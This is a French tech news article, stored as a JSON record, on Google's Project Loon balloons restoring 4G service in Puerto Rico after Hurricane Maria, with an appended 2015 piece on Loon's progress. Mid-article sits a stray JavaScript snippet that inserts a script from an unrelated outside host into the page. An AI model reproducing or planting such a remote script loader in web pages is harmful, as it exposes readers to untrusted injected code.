{"title": "Projet Loon : les ballons de Google au secours de Porto Rico", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-10-09", "content": "Google vient d'obtenir l'autorisation de deployer une flotte de ballons stratospheriques qui vont aider a retablir un reseau de telephonie 4G sur l'ile de Porto Rico devastee par l'ouragan Maria. Le 20 septembre, l' ouragan  Maria traversait l'ile de Porto Rico, laissant derriere lui un territoire devaste par des  vents  de plus de 200 km/h et des pluies diluviennes (36 cm en une heure, record mondial). Trois millions et demi d'habitants se sont retrouves prives d'electricite, d'eau portable et de moyens de communication. Depuis, les efforts pour restaurer les infrastructures essentielles avancent avec peine. Selon les chiffres communiques par le gouvernement de  Porto Rico , pres de 20 jours apres la catastrophe, plus de 88 % des foyers sont toujours prives d'electricite et pres de la moitie n'ont pas d'eau potable. Le reseau de communication a egalement beaucoup souffert, plus de 81 % des antennes relais sont hors service. L'ile de Porto Rico, avant (a droite, le 24 juillet 2017) et apres (a gauche, le 25 septembre 2017) le passage de l'ouragan Maria le 20 septembre 2017. (c) NOAA                               Tesla et Alphabet au secours de Porto Rico C'est dans ce contexte dramatique que quelques grands noms de l'industrie high-tech ont choisi de s'impliquer. Elon Musk, le dirigeant de Tesla, a propose  via   Twitter  de reconstruire le reseau electrique de l'ile en s'appuyant sur sa solution combinant des batteries et des panneaux photovoltaiques. De son cote Alphabet, la maison-mere de  Google , a obtenu l'autorisation de participer a la restauration du reseau de communication de Porto Rico. Le geant californien a recu le feu vert de la  Federal Communications Commission  (FCC) pour deployer 30 de ses  ballons  stratospheriques du  Projet Loon  durant une periode de six mois.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ils vont servir de relais pour creer un reseau de telephonie  4G  d'urgence, le temps de remettre le reseau terrestre en etat. Pour ce projet, Alphabet va travailler avec les operateurs de telephonies locaux afin de pouvoir utiliser leurs frequences. Une initiative similaire a ete menee en mars dernier au  Perou  suite aux inondations qui ont frappe le pays. Les responsables du Projet Loon soulignaient alors que c'etait la premiere fois qu'une connexion  Internet  diffusee  via  des ballons etait distribuee a plusieurs dizaines de milliers de personnes. Pour en savoir plus Projet Loon : les ballons de Google peuvent desormais relayer la 4G Article initial de Marc Zaffagni, paru le 13/03/2015 Lance en juin 2013, le projet Google Loon d'acces Internet  via  des ballons stratospheriques a beaucoup evolue depuis. Les ballons peuvent desormais voler durant six mois consecutifs et retransmettre une connexion cellulaire 4G a des terminaux compatibles. Des essais sont en cours en Nouvelle-Zelande et au Bresil. Il y a un peu moins de deux ans, Google lancait le  projet Loon  dont l'ambition est de fournir une connexion Internet aux deux tiers de la population mondiale qui n'en beneficient pas a l'heure actuelle. Cette initiative, a laquelle s'est associe le  Cnes , a franchi plusieurs paliers techniques importants. Le site  Ars Technica , qui a pu echanger avec l'equipe du projet Loon, rend compte de ces progres. Les ballons stratospheriques utilises par  Google  sont desormais capables de relayer un signal cellulaire 4G et d'offrir une  vitesse  de telechargement de 10 Mbit/s. L'autre avancee notable du projet Loon est que les ballons peuvent voler pendant plus d'une centaine de jours.  Google  a recemment annonce avoir battu un nouveau record avec un vol de 187 jours. Lors de cet essai, le ballon a effectue neuf fois le tour de la  Terre , affrontant des temperatures extremes (- 75 degC), des vents de 291 km/h et en evoluant jusqu'a 21 km d'altitude.  Contrairement a ce que fait le geant americain avec son projet  Google Fibre  de connexion Internet tres haut  debit  par fibre optique, les ballons du projet Loon ne vont pas fournir le service en lui-meme mais relayer le signal des reseaux cellulaires existants. Chaque ballon est en effet equipe d'une liaison bidirectionnelle qui lui permet de recevoir le signal emis par les antennes relais puis de le repercuter vers des  smartphones , des  ordinateurs  ou d'autres appareils equipes d'un systeme de reception compatible 4G. Un ballon peut diffuser le signal dans un rayon de 80 km. Ce perimetre peut etre etendu si plusieurs ballons se transmettent le signal avant de le renvoyer sur Terre. L'avantage crucial pour les operateurs de telephonie est qu'ils pourront ainsi etendre leur reseau sans avoir a investir dans les infrastructures, ce qui est un frein majeur pour desservir des zones jugees peu rentables economiquement. Pour le moment, Google teste son service de connexion Internet par ballons a petite echelle en Nouvelle-Zelande. Plus recemment, au Bresil, des eleves d'une ecole rurale ontpu acceder a la Toilepour la premiere fois grace a la connexion 4G relayee par les ballons Loon. (c) Google Loon                               Autorises a voler dans tous les pays de l'hemisphere sud Les ballons Google ont donc le potentiel d'amener l'Internet a au moins une partie des 5 milliards de personnes qui n'en disposent pas dans les nombreuses zones du Globe non desservies en raison d'obstacles  physiques  ou economiques. La  compatibilite   4G  est aussi un atout considerable puisqu'elle fonctionne avec les terminaux compatibles existants et peut assurer une qualite de connexion suffisante pour la navigation Internet. A l'origine, le projet Loon diffusait  via  un signal  3G  et necessitait l'installation d'une antenne sur les habitations participant aux essais. Google a fait evoluer la puissance d' emission  du dispositif afin de pouvoir toucher directement les antennes des  telephones mobiles . Cette orientation technique vise a repondre a une tendance de plus en plus marquee dans les pays en voie de developpement ou les habitants n'ayant pas les moyens de posseder plusieurs appareils s'equipent uniquement d'un  smartphone  pour communiquer et naviguer sur la Toile.  Initialement lance en Nouvelle-Zelande, le projet Loon a recemment ete introduit en Amerique latine au Bresil. La-bas, Google a etrenne sa technologie 4G avec une ecole rurale qui ne disposait jusqu'alors d'aucun acces Internet. Le geant americain ne donne pas encore de date precise pour un lancement a grande echelle de son service, mais indique qu'il a desormais des autorisations de  survol  de tous les pays de l' hemisphere sud . L'ouragan Maria observe en infrarouge                       L'ouragan Maria vu par le satellite GOES-16, de la NOAA le 20 septembre 2017, quand il passait au-dessus de l'ile de Porto Rico. L'image est prise en infrarouge. Les couleurs sont donc fausses mais informatives. Elles indiquent la densite des nuages et la force de la tempete. Autour de l'oeil du cyclone, la couleur rouge montre les plus fortes puissances.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  lancer de ballons  |  ballons helium  |  ballons air chaud  |  peuvent entrer en collision avec terre  |  tous problemes peuvent avoir solution technique", "theme": "tech"}